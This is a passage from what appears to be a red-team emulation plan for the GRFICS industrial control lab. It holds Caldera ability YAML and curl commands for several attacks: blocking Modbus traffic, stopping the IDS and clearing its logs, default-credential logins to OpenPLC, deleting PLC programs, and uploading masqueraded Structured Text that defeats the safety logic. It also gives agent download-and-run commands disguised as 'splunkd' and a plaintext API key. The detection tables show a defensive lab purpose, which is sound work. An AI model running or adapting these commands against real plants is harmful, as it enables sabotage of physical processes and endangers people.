      -X POST "http://192.168.90.200:5000/ids/clear-alerts" 2>/dev/null &&
      echo "IDS_ALERTS_CLEARED" ||
      echo "Log clearing attempted via API"
    timeout: 15
```

**Ability: Block PLC Commands to Field Devices**

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000004
  name: Router - Block Modbus Command Messages
  description: >
    Add iptables FORWARD rules to DROP all Modbus TCP traffic from
    PLC (192.168.95.2) to simulation devices (192.168.95.10-15).
    This prevents the PLC from sending valve setpoints, leaving
    field devices at their last commanded position.
  tactic: inhibit-response-function
  technique_id: T0803
  technique_name: Block Command Message
  executors:
  - platform: linux
    name: sh
    command: >
      for target_ip in 10 11 12 13 14 15; do
        curl -s -b /tmp/router.jar
        -X POST "http://192.168.90.200:5000/firewall/add"
        -d "src_ip=192.168.95.2&dst_ip=192.168.95.$target_ip&protocol=tcp&dport=502&action=DROP"
        2>/dev/null;
      done &&
      curl -s -b /tmp/router.jar
      -X POST "http://192.168.90.200:5000/firewall/apply" 2>/dev/null &&
      echo "MODBUS_COMMANDS_BLOCKED: PLC can no longer reach field devices"
    timeout: 30
```

**Ability: Block Field Device Responses to PLC**

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000005
  name: Router - Block Modbus Reporting Messages
  description: >
    Add iptables FORWARD rules to DROP Modbus TCP responses from
    simulation devices back to the PLC, blinding the PLC to the
    actual process state.
  tactic: inhibit-response-function
  technique_id: T0804
  technique_name: Block Reporting Message
  executors:
  - platform: linux
    name: sh
    command: >
      for src_ip in 10 11 12 13 14 15; do
        curl -s -b /tmp/router.jar
        -X POST "http://192.168.90.200:5000/firewall/add"
        -d "src_ip=192.168.95.$src_ip&dst_ip=192.168.95.2&protocol=tcp&dport=502&action=DROP"
        2>/dev/null;
      done &&
      curl -s -b /tmp/router.jar
      -X POST "http://192.168.90.200:5000/firewall/apply" 2>/dev/null &&
      echo "MODBUS_RESPONSES_BLOCKED: PLC receives no field data"
    timeout: 30
```

**Step 3: Adversary Profile**

```yaml
name: Network Infrastructure Sabotage Adversary
description: >
  Targets the ICS router/firewall to disable IDS, clear logs,
  and deploy iptables rules that isolate the PLC from its field
  devices, causing complete denial of control.
adversary_id: cc008888-aaaa-bbbb-cccc-000000000008
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- b8c9d0e1-8888-8888-8888-000000000001  # Router login
- b8c9d0e1-8888-8888-8888-000000000002  # Stop IDS
- b8c9d0e1-8888-8888-8888-000000000003  # Clear logs
- b8c9d0e1-8888-8888-8888-000000000004  # Block PLC commands
- b8c9d0e1-8888-8888-8888-000000000005  # Block device responses
- a1b2c3d4-1111-1111-1111-000000000002  # Verify PLC lost control
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Router login | Router syslog, Flask logs (`shared_logs/router/flask`) | POST /login from attacker IP | DC0067 (Logon Session Creation) |
| IDS stop | Router syslog | Suricata process killed | DC0033 (Process Termination) |
| Log clearing | ABSENCE in eve.json | Gap in Suricata logs | DC0040 (File Deletion) |
| Firewall rule add | Router netfilter (`shared_logs/router/netfilter`) | New DROP rules via Flask API | DC0061 (File Modification) |
| Modbus traffic stops | PLC daemon.log, plc_app | Modbus master read timeouts / connection failures | DC0108 (Device Alarm) |
| Process drift | Simulation process_alarms | Process values drifting without PLC correction | DC0109 (Process/Event Alarm) |

#### Variation: Selective Blocking

Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while allowing reads (FC 0x03, 0x04). This lets the PLC see the process drifting but be unable to correct it -- a more psychologically distressing situation for operators.

#### Escalation: Router Restart

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000006
  name: Router - Force Device Restart
  description: Restart the router to disrupt all inter-zone routing
  tactic: inhibit-response-function
  technique_id: T0816
  technique_name: Device Restart/Shutdown
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
      -X POST "http://192.168.90.200:5000/system/restart" 2>/dev/null &&
      echo "ROUTER_RESTART_TRIGGERED"
    timeout: 15
```

#### Assumptions

- Router Flask UI is accessible at `192.168.90.200:5000` with default credentials `admin:password`
- The Flask app provides endpoints for firewall rule management (`/firewall/add`, `/firewall/apply`)
- Suricata can be stopped via the web UI or an API endpoint
- iptables FORWARD rules applied via the Flask UI are effective on inter-VLAN traffic

---

### Chain 9: PLC Operating Mode Abuse + Data Destruction + Masquerading

**Adversary Narrative**: An insider threat or advanced attacker who understands OpenPLC's architecture. They use the PLC's web API to change operating modes, destroy legitimate programs, upload a masqueraded malicious program, and ultimately remove all safety protections. The malicious program is named identically to the legitimate one to avoid detection.

**Kill Chain**: PLC web login -> Mode detection -> Stop PLC -> Delete programs -> Upload masqueraded malicious logic -> Start PLC -> Safety protection defeated

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Hardcoded Credentials | T0891 | Persistence | OpenPLC ships with `openplc:openplc` baked into `openplc.db` | Use hardcoded default credentials |
| 2 | Execution through API | T0871 | Execution | Use OpenPLC REST API to query runtime status | Programmatic PLC management |
| 3 | Detect Operating Mode | T0868 | Collection | `GET /runtime_status` to check RUN/STOP mode | Confirm PLC is running before attack |
| 4 | Change Operating Mode | T0858 | Execution/Evasion | `POST /stop-plc` to halt PLC execution | PLC stops running; valves freeze at last position |
| 5 | Program Upload | T0845 | Collection | `GET /get-program-body` to download current ST program | Exfiltrate legitimate PLC logic for analysis |
| 6 | Data Destruction | T0809 | Inhibit Response | `POST /delete-program` to remove all PLC programs | Legitimate control logic destroyed |
| 7 | Masquerading | T0849 | Evasion | Name malicious ST file identically to legitimate (`326339.st`) | Attack logic appears as legitimate program |
| 8 | Modify Program | T0889 | Persistence | Upload masqueraded program with disabled safety interlocks | Malicious logic installed as "legitimate" program |
| 9 | Change Operating Mode | T0858 | Execution | `POST /start-plc` to restart with malicious logic | PLC runs attacker's code |
| 10 | Loss of Protection | T0837 | Impact | Pressure_override disabled, run_bit safety bypassed | No safety functions operational |

#### Caldera Implementation

**Ability: Check PLC Runtime Status**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000001
  name: OpenPLC - Detect Operating Mode via API
  description: >
    Query the OpenPLC web API to determine current runtime status
    (running/stopped), active program name, and protocol states.
  tactic: collection
  technique_id: T0868
  technique_name: Detect Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login"
      -d "username=openplc&password=openplc" -L -o /dev/null &&
      echo "=== Runtime Status ===" &&
      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
      grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 &&
      echo "=== Programs ===" &&
      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" |
      grep -oP '[0-9]+\.st' | sort -u &&
      echo "PLC_MODE_DETECTED"
    timeout: 30
```

**Ability: Stop PLC Runtime**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000002
  name: OpenPLC - Change Operating Mode to STOP
  description: >
    Stop the PLC runtime execution. All valve outputs freeze at
    their last commanded values. The PLC no longer runs control logic.
  tactic: execution
  technique_id: T0858
  technique_name: Change Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc.jar
      -X POST "http://192.168.95.2:8080/stop-plc"
      -L -o /tmp/stop_result.html -w "%{http_code}" &&
      echo "PLC_STOPPED" &&
      sleep 2 &&
      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
      grep -i "stopped" && echo "CONFIRMED: PLC in STOP mode"
    timeout: 30
```

**Ability: Download Current Program (Collection)**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000003
  name: OpenPLC - Download Active Program
  description: Exfiltrate the currently active PLC program for analysis
  tactic: collection
  technique_id: T0845
  technique_name: Program Upload
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc.jar
      "http://192.168.95.2:8080/get-program-body?program_name=326339.st"
      -o /tmp/legitimate_program.st &&
      echo "Program downloaded:" &&
      wc -l /tmp/legitimate_program.st &&
      head -5 /tmp/legitimate_program.st
    timeout: 30
```

**Ability: Destroy PLC Programs**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000004
  name: OpenPLC - Data Destruction of PLC Programs
  description: >
    Delete all Structured Text programs from the PLC's persistent
    storage. This prevents recovery of the legitimate control logic
    and forces operators to restore from backup.
  tactic: inhibit-response-function
  technique_id: T0809
  technique_name: Data Destruction
  executors:
  - platform: linux
    name: sh
    command: >
      for prog in 326339.st 690525.st 655326.st blank_program.st; do
        curl -s -b /tmp/plc.jar
        -X POST "http://192.168.95.2:8080/delete-program"
        -d "program_name=$prog" -L -o /dev/null;
        echo "DELETED: $prog";
      done &&
      echo "ALL_PROGRAMS_DESTROYED"
    timeout: 30
```

**Ability: Upload Masqueraded Malicious Program**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000005
  name: OpenPLC - Upload Masqueraded Malicious Logic
  description: >
    Upload a malicious ST program named identically to the legitimate
    program (326339.st). The malicious logic removes pressure_override,
    sets dangerous valve positions, but looks identical at first glance.
  tactic: evasion
  technique_id: T0849
  technique_name: Masquerading
  executors:
  - platform: linux
    name: sh
    command: >
      cat > /tmp/326339.st << 'STEOF'
      FUNCTION scale_to_real : REAL
        VAR_INPUT raw_input_value : UINT := 0; END_VAR
        VAR_OUTPUT scaled_real : REAL := 0.0; END_VAR
        VAR_INPUT real_max : REAL := 0.0; real_min : REAL := 0.0; END_VAR
        VAR raw_max : UINT := 65535; raw_min : UINT := 0; END_VAR
        VAR rate : REAL := 1.0; offset : REAL := 1.0; END_VAR
        rate := (real_max - real_min) / UINT_TO_REAL(raw_max - raw_min);
        offset := real_min - UINT_TO_REAL(raw_min)*rate;
        scaled_real := UINT_TO_REAL(raw_input_value)*rate + offset;
        scale_to_real := scaled_real;
      END_FUNCTION

      FUNCTION scale_to_uint : UINT
        VAR_INPUT real_in : REAL := 0.0; END_VAR
        VAR_OUTPUT uint_out : UINT := 0; END_VAR
        uint_out := REAL_TO_UINT((real_in / 100.0) * 65535.0);
        scale_to_uint := uint_out;
      END_FUNCTION

      PROGRAM main1
        VAR
          f1_valve_sp AT %QW100 : UINT;
          f2_valve_sp AT %QW101 : UINT;
          purge_valve_sp AT %QW102 : UINT;
          product_valve_sp AT %QW103 : UINT;
          run_bit AT %QX5.0 : BOOL := TRUE;
        END_VAR
        f1_valve_sp := 65535;
        f2_valve_sp := 65535;
        purge_valve_sp := 0;
        product_valve_sp := 0;
        run_bit := TRUE;
      END_PROGRAM

      CONFIGURATION Config0
        RESOURCE Res0 ON PLC
          TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
          PROGRAM instance0 WITH task0 : main1;
        END_RESOURCE
      END_CONFIGURATION
      STEOF

      curl -s -b /tmp/plc.jar
      -X POST "http://192.168.95.2:8080/upload-program"
      -F "file=@/tmp/326339.st"
      -L -o /tmp/upload.html -w "%{http_code}" &&
      echo "MASQUERADED_PROGRAM_UPLOADED: 326339.st"
    timeout: 60
```

**Ability: Compile and Restart PLC with Malicious Logic**

```yaml
- id: c9d0e1f2-9999-9999-9999-000000000006
  name: OpenPLC - Start PLC with Malicious Logic
  description: >
    Compile the masqueraded malicious program and restart the PLC
    runtime. The PLC will now run attacker-controlled logic with
    no safety interlocks, causing loss of protection.
  tactic: execution
  technique_id: T0858
  technique_name: Change Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc.jar
      -X POST "http://192.168.95.2:8080/compile-program?program_name=326339.st"
      -o /tmp/compile.html &&
      echo "Compilation started... waiting 15s" && sleep 15 &&
      curl -s -b /tmp/plc.jar
      -X POST "http://192.168.95.2:8080/start-plc"
      -o /tmp/start.html &&
      echo "PLC_RESTARTED_WITH_MALICIOUS_LOGIC"
    timeout: 120
```

**Step 3: Adversary Profile**

```yaml
name: PLC Mode Abuse and Data Destruction Adversary
description: >
  Advanced attack targeting PLC operating modes. Stops PLC, destroys
  legitimate programs, uploads identically-named malicious logic
  to masquerade as the original, then restarts PLC without safety
  protections.
adversary_id: cc009999-aaaa-bbbb-cccc-000000000009
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- c9d0e1f2-9999-9999-9999-000000000001  # Detect operating mode
- c9d0e1f2-9999-9999-9999-000000000003  # Download current program
- c9d0e1f2-9999-9999-9999-000000000002  # Stop PLC
- c9d0e1f2-9999-9999-9999-000000000004  # Destroy all programs
- c9d0e1f2-9999-9999-9999-000000000005  # Upload masqueraded program
- c9d0e1f2-9999-9999-9999-000000000006  # Compile and start
- a1b2c3d4-1111-1111-1111-000000000002  # Verify impact (from Chain 1)
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| PLC login | PLC auth.log | HTTP auth from attacker IP | DC0067 (Logon Session) |
| Runtime query | PLC syslog/daemon | GET /dashboard from external IP | DC0038 (Application Log) |
| PLC stop | PLC daemon.log, plc_app | OpenPLC runtime process terminated | DC0033 (Process Termination) |
| Program deletion | PLC audit, syslog | File unlink operations on .st files | DC0040 (File Deletion) |
| Program upload | PLC syslog, audit | POST /upload-program, new file creation | DC0039 (File Creation) |
| Compilation | PLC syslog | compile_program.sh, matiec compiler execution | DC0032 (Process Creation) |
| PLC start | PLC daemon.log | OpenPLC runtime process started | DC0032 (Process Creation) |
| Safety loss | Simulation process_alarms | Process without safety interlocks | DC0109 (Process/Event Alarm) |

#### Assumptions

- OpenPLC web API endpoints (`/stop-plc`, `/start-plc`, `/upload-program`, `/compile-program`, `/delete-program`) are accessible with valid session
- The PLC persistent volume (`plc_volume`) stores programs at `/docker_persistent/st_files/`
- Program compilation takes approximately 10-15 seconds

---

### Chain 10: Coordinated Multi-Vector APT -- Full Kill Chain

**Adversary Narrative**: A sophisticated APT group (analogous to CHERNOVITE/PIPEDREAM) executes a coordinated attack across all ICS layers simultaneously. Phase 1 disables defenses (IDS, alarms). Phase 2 establishes persistence on multiple assets. Phase 3 executes the process manipulation attack while maintaining operator deception. This chain combines techniques from all previous chains into a single coordinated operation.

**Kill Chain**: Multi-vector initial access -> Defense evasion -> Lateral movement across all assets -> Simultaneous process attack + operator deception + safety defeat

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Target | Expected Effect |
|------|---------------|-------------|--------|--------|-----------------|
| 1 | Internet Accessible Device | T0883 | Initial Access | HMI at :8080 | Identify exposed SCADA web interface |
| 2 | Default Credentials | T0812 | Lateral Movement | Router, HMI, PLC | Compromise all 3 management interfaces |
| 3 | Exploitation of Remote Services | T0866 | Initial Access | PLC web at 192.168.95.2:8080 | Gain PLC management access from DMZ |
| 4 | Service Stop | T0881 | Inhibit Response | Router Suricata | IDS offline |
| 5 | Indicator Removal on Host | T0872 | Evasion | Router logs | Destroy evidence |
| 6 | Modify Alarm Settings | T0838 | Inhibit Response | HMI SCADA-LTS | All alarms disabled |
| 7 | Lateral Tool Transfer | T0867 | Lateral Movement | Kali -> modbus_cli | Attack tooling deployed |
| 8 | Detect Operating Mode | T0868 | Collection | PLC at 192.168.95.2 | Confirm PLC is in RUN |
| 9 | Automated Collection | T0802 | Collection | All Modbus devices | Full process state baseline |
| 10 | Change Operating Mode | T0858 | Execution | PLC (stop) | PLC halted |
| 11 | Modify Program | T0889 | Persistence | PLC | Malicious logic uploaded |
| 12 | Change Operating Mode | T0858 | Execution | PLC (start) | Malicious logic running |
| 13 | Manipulation of View | T0832 | Impact | HMI dashboard | Operators see false-normal |
| 14 | Manipulation of Control | T0831 | Impact | Modbus devices | Direct valve manipulation |
| 15 | Spoof Reporting Message | T0856 | Evasion | Tank sensor (.14) | PLC sees false pressure |
| 16 | Loss of Protection | T0837 | Impact | PLC safety functions | No safety interlocks |
| 17 | Damage to Property | T0879 | Impact | Reactor | Uncontrolled overpressure |

#### Caldera Implementation

**Adversary Profile: Full APT Campaign**

```yaml
name: CHERNOVITE-Style Full ICS APT Campaign
description: >
  Multi-vector, multi-phase coordinated attack across all ICS layers.
  Phase 1: Defense neutralization. Phase 2: Multi-asset persistence.
  Phase 3: Coordinated process attack with operator deception.
adversary_id: cc00AAAA-aaaa-bbbb-cccc-00000000000A
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
# Phase 1: Defense Neutralization
- b8c9d0e1-8888-8888-8888-000000000001  # Router login
- b8c9d0e1-8888-8888-8888-000000000002  # Stop Suricata IDS
- b8c9d0e1-8888-8888-8888-000000000003  # Clear router logs
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login
- a7b8c9d0-7777-7777-7777-000000000003  # Disable HMI alarms
# Phase 2: PLC Takeover
- b2c3d4e5-2222-2222-2222-000000000001  # PLC login
- c9d0e1f2-9999-9999-9999-000000000001  # Detect PLC operating mode
- a1b2c3d4-1111-1111-1111-000000000003  # Enumerate all process I/O
- c9d0e1f2-9999-9999-9999-000000000003  # Download current program
- c9d0e1f2-9999-9999-9999-000000000002  # Stop PLC
- c9d0e1f2-9999-9999-9999-000000000005  # Upload masqueraded malicious program
- c9d0e1f2-9999-9999-9999-000000000006  # Compile and restart PLC
# Phase 3: Coordinated Impact
- a7b8c9d0-7777-7777-7777-000000000004  # Manipulate HMI view
- c3d4e5f6-3333-3333-3333-000000000003  # Combined Modbus attack + sensor spoof
- a1b2c3d4-1111-1111-1111-000000000002  # Verify pressure rising
```

**Operation via REST API**

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "CHERNOVITE-Full-APT-001",
    "adversary": {"adversary_id": "cc00AAAA-aaaa-bbbb-cccc-00000000000A"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

#### Expected Telemetry and Logs

| Phase | Log Sources | Key Indicators | Data Components |
|-------|-------------|----------------|-----------------|
| Phase 1 (Defense) | Router flask, syslog; HMI catalina | Logins from 192.168.90.6 to router and HMI; Suricata process killed; alarm config changed | DC0067, DC0033, DC0038, DC0061 |
| Phase 2 (PLC) | PLC auth, syslog, daemon, audit, plc_app | Login to PLC web; program download; runtime stop; file deletion; new upload; compilation; restart | DC0067, DC0033, DC0039, DC0040, DC0032 |
| Phase 3 (Impact) | Simulation process_alarms, supervisor; Router eve.json (if IDS was restarted); HMI catalina | Modbus writes from attacker IP; pressure deviations; view modification; no alarms despite dangerous conditions | DC0109, DC0108, DC0082, DC0085 |

---

## Master Technique Coverage Table

All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out of 79 in MITRE ATT&CK for ICS v18:

| Technique ID | Technique Name | Covered In Chain(s) |
|-------------|---------------|-------------------|
| T0800 | Activate Firmware Update Mode | 9 (PLC mode change as analog) |
| T0801 | Monitor Process State | 1, 3 |
| T0802 | Automated Collection | 7, 10 |
| T0803 | Block Command Message | 8 |
| T0804 | Block Reporting Message | 8 |
| T0806 | Brute Force I/O | 6 |
| T0807 | Command-Line Interface | 5 |
| T0809 | Data Destruction | 9 |
| T0812 | Default Credentials | 2, 3, 4, 7, 8, 9, 10 |
| T0813 | Denial of Control | 4, 8 |
| T0814 | Denial of Service | 6 |
| T0815 | Denial of View | 7 |
| T0816 | Device Restart/Shutdown | 8 |
| T0819 | Exploit Public-Facing Application | 1, 2 |
| T0821 | Modify Controller Tasking | 4 |
| T0822 | External Remote Services | 5 |
| T0823 | Graphical User Interface | 7, 8 |
| T0826 | Loss of Availability | 6 |
| T0827 | Loss of Control | 2, 10 |
| T0828 | Loss of Productivity and Revenue | 6 |
| T0829 | Loss of View | 3 |
| T0831 | Manipulation of Control | 1, 3, 10 |
| T0832 | Manipulation of View | 7, 10 |
| T0835 | Manipulate I/O Image | 5 |
| T0836 | Modify Parameter | 6 |
| T0837 | Loss of Protection | 9, 10 |
| T0838 | Modify Alarm Settings | 7, 10 |
| T0840 | Network Connection Enumeration | 5, 6 |
| T0842 | Network Sniffing | 1 |
| T0843 | Program Download | 2 |
| T0845 | Program Upload | 9 |
| T0846 | Remote System Discovery | 1, 2, 3, 6 |
| T0848 | Rogue Master | 6 |
| T0849 | Masquerading | 9 |
| T0852 | Screen Capture | 3 |
| T0853 | Scripting | 5 |
| T0856 | Spoof Reporting Message | 3, 10 |
| T0858 | Change Operating Mode | 9, 10 |
| T0861 | Point & Tag Identification | 1, 4 |
| T0866 | Exploitation of Remote Services | 10 |
| T0867 | Lateral Tool Transfer | 5, 10 |
| T0868 | Detect Operating Mode | 6, 9, 10 |
| T0869 | Standard Application Layer Protocol | 5 |
| T0871 | Execution through API | 7, 9 |
| T0872 | Indicator Removal on Host | 8, 10 |
| T0873 | Project File Infection | 5 (variation) |
| T0877 | I/O Image | 5 |
| T0878 | Alarm Suppression | 7 |
| T0879 | Damage to Property | 1 |
| T0880 | Loss of Safety | 4 |
| T0881 | Service Stop | 8, 10 |
| T0882 | Theft of Operational Information | 7 |
| T0883 | Internet Accessible Device | 5, 10 |
| T0885 | Commonly Used Port | 5 |
| T0886 | Remote Services | 5 |
| T0888 | Remote System Information Discovery | 1, 3, 4 |
| T0889 | Modify Program | 2, 9, 10 |
| T0891 | Hardcoded Credentials | 9 |
| T0892 | Change Credential | 7 (escalation) |
| T0893 | Data from Local System | 5 |

**Techniques NOT covered** (infeasible in Docker-based GRFICS): T0817 (Drive-by Compromise), T0830 (Adversary-in-the-Middle), T0834 (Native API), T0847 (Replication via Removable Media), T0851 (Rootkit), T0857 (System Firmware), T0860 (Wireless Compromise), T0862 (Supply Chain Compromise), T0863 (User Execution), T0864 (Transient Cyber Asset), T0865 (Spearphishing Attachment), T0874 (Hooking), T0884 (Connection Proxy), T0887 (Wireless Sniffing), T0890 (Exploitation for PrivEsc), T0894 (System Binary Proxy Execution), T0895 (Autorun Image).

---

## Caldera Deployment Quick Reference

### Agent Deployment Commands

**Kali agent (DMZ):**
```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd; ./splunkd -server $server -group red -v
```

**EWS agent (ICS network):**
```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd; nohup ./splunkd -server $server -group ews -v &
```

### Batch Ability Upload via REST API

For each ability YAML, convert to JSON and POST:

```bash
API="http://localhost:8888/api/v2/abilities"
KEY="VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y"

curl -X POST "$API" -H "KEY: $KEY" -H "Content-Type: application/json" \
  -d '{
    "ability_id": "<UUID>",
    "name": "<name>",
    "description": "<description>",
    "tactic": "<tactic>",
    "technique_id": "<TID>",
    "technique_name": "<technique_name>",
    "executors": [{
      "platform": "linux",
      "name": "sh",
      "command": "<command>",
      "payloads": ["modbus_cli"]
    }]
  }'
```

### Operation Execution Pattern

All operations follow this pattern:

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<Operation-Name>",
    "adversary": {"adversary_id": "<adversary-uuid>"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "<red|ews>",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Verification After Each Operation

```bash
# Check Suricata for Modbus alerts
docker exec router cat /var/log/suricata/eve.json | \
  python3 -c "import sys,json;[print(json.dumps(j,indent=2)) for l in sys.stdin for j in [json.loads(l)] if 'modbus' in str(j).lower() or j.get('event_type')=='alert']" 2>/dev/null | head -50

# Check simulation process alarms
ls -la shared_logs/simulation/process_alarms/

# Check PLC application events
cat shared_logs/plc/plc_app/* 2>/dev/null | tail -20

# Check 3D visualization
echo "Open http://localhost to observe chemical plant state"
```